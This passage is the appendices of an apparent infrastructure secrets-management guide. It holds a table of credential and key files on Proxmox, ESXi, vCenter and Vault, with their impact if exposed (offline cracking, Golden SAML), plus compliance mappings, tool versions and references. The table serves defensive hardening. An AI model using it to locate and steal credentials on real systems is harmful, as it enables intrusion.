| Proxmox | /etc/pve/storage.cfg | Storage passwords | High — access all storage |
| Proxmox | /etc/pve/priv/shadow.cfg | User password hashes | High — offline cracking |
| Proxmox | /etc/ceph/ceph.client.admin.keyring | Ceph admin key | Critical — full storage access |
| ESXi | /etc/vmware/hostd/config.xml | Host passwords (encrypted) | High |
| ESXi | /vmfs/volumes/*/*.vmx | VM passwords, annotations | Medium-High |
| vCenter | /etc/vmware-vpx/vpxd.cfg | DB password (encrypted) | Critical with symkey |
| vCenter | /etc/vmware-vpx/ssl/symkey.dat | Decryption key for configs | Critical |
| vCenter | vmdir database (data.mdb) | SSO signing cert | Critical — Golden SAML |
| Vault | /opt/vault/data/ | All secrets (encrypted) | Critical — unseal keys |

## Appendix B: Compliance Mapping

| Control | Framework | Section |
|---|---|---|
| Credential rotation | PCI DSS 8.2.4 | Sections 9.1, 9.2 |
| Secret storage | CIS Controls 16.4 | Sections 2, 7 |
| Key management | NIST SP 800-57 | Sections 4, 5 |
| Access logging | SOC 2 CC6.1 | Section 6.3 |
| Certificate management | NIST SP 800-52r2 | Section 5 |
| Privileged access | CIS Controls 6.5 | Sections 3, 4 |
| Incident response | NIST SP 800-61r2 | Section 9.3 |

## Appendix C: Tool Versions and Compatibility

| Tool | Minimum Version | Tested Version | Notes |
|---|---|---|---|
| HashiCorp Vault | 1.15 | 1.17.3 | Raft HA requires 1.4+ |
| Proxmox VE | 8.0 | 8.2 | API token privsep requires 6.1+ |
| VMware vSphere | 7.0 U3 | 8.0 U3 | SSO changes in 8.0 |
| Ansible | 2.15 | 2.17 | community.hashi_vault collection required |
| Terraform | 1.5 | 1.8 | State encryption native in 1.7+ |
| SOPS | 3.8 | 3.9.0 | age backend preferred over PGP |
| step-ca | 0.25 | 0.27 | ACME provisioner stable |
| age | 1.1 | 1.2 | Ed25519/X25519 based |

---

## References

1. HashiCorp Vault Documentation — https://developer.hashicorp.com/vault/docs
2. Proxmox VE Administration Guide — https://pve.proxmox.com/pve-docs/
3. VMware vSphere Security Guide — https://docs.vmware.com/en/VMware-vSphere/8.0/vsphere-security/
4. NIST SP 800-57 — Recommendation for Key Management
5. CIS Benchmarks — VMware ESXi 8.0, Proxmox VE (community)
6. Mandiant — "Highly Evasive Attacker Leverages SolarWinds Supply Chain — Golden SAML" (2020)
7. OpenSSH Certificate Authentication — https://man.openbsd.org/ssh-keygen#CERTIFICATES
8. SOPS — https://github.com/getsops/sops
9. Vault SSH Secret Engine — https://developer.hashicorp.com/vault/docs/secrets/ssh
10. Vault PKI Engine — https://developer.hashicorp.com/vault/docs/secrets/pki
